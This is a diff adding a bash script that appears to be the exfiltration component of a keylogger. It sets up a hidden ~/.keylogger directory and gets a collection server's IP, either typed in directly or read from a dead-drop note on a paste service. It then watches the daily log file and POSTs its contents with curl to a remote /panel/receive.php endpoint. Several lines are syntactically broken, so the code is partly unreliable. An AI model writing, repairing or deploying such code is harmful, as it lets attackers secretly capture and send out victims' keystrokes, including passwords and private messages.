@@ -1,0 +1,72 @@
+
+#!/bin/bash
+mkdir $HOME/.keylogger 2> /dev/null
+LOGDIR=$HOME/.keylogger/
+FORWARDFILE=$HOME/.keylogger/forward.cfg
+IPURLFILE=$HOME/.keylogger/ipurl.cfg
+IPFILE=$HOME/.keylogger/iptype.cfg
+IPRAW=$HOME/.keylogger/ipraw.cfg
+function setup {
+
+
+if [ ! -f $FORWARDFILE ];
+	 then
+	echo "Do you want to forward logs to a web server [Y]es or [N]o? (Default is [N]o)"
+	read webserver
+
+	if [ "$webserver" = 'Y' ] || [ "$webserver" = 'y' ] ; 
+		then
+		echo "forward:true" > $FORWARDFILE
+		echo "Forwarding to server"
+		setup
+	else
+		echo "forward:false" > $FORWARDFILE
+		echo "Not forwarding to server"
+		setup   
+   
+	fi
+fi
+
+if [ $(cat $FORWARDFILE) = "forward:true" ];
+	then 
+	if [ ! -f $IPFILE ];
+		then
+		echo "Do you use a [S]tatic or [D]ynamic IP Adress? (Default is [S]tatic)"
+		read iptype
+		if [ "$iptype" = 'd' ] ||  [ "$iptype" = 'D' ];
+			then
+			echo "iptype:dynamic" > $IPFILE
+			echo "Please use a free service like https://www.ghostbin.com/ or https://simplenote.com/ to make a note to put your local IP address in";
+			echo "Be sure to create an account so you can edit it later. Make the title of the note something other than your local IP address. something like this:";
+			echo "https://app.simplenote.com/publish/lSr4dF";
+			echo "URL of the note:"
+			read ipurl
+			echo $ipurl > $IPURLFILE
+			setup
+		else
+			echo "iptype:static" > $IPFILE
+			echo "What is the IP address to connect to?"
+			read ipurl
+			echo $ipurl > $IPRAW
+			setup
+		fi
+	fi
+fi 
+}
+setup
+chmod 777 -R $HOME/.keylogger
+if [ -f $IPRAW ];
+	then
+	ipaddr=$(cat $IPRAW)
+else
+	ipaddr=curl $(cat '$IPURLFILE') 2>&1 | grep -o - P '\d+\.\d+\.\d\.\d'
+fi
+#ipaddr=$(curl https://app.simplenote.com/publish/lSr4dF 2>&1 | grep -o 192\.168\.2\..*)
+touch $HOME/.keylogger/$(date +"%d:%m:%Y.log")
+while inotifywait -q -e modify $HOME/.keylogger/$(date +"%d:%m:%Y.log") >/dev/null; do
+    
+    cat $HOME/.keylogger/$(date +'%d:%m:%Y.log')
+    
+    curl --data "data=$(cat $HOME/.keylogger/$(date +'%d:%m:%Y.log'))" $ipaddr/panel/receive.php
+    
+done	
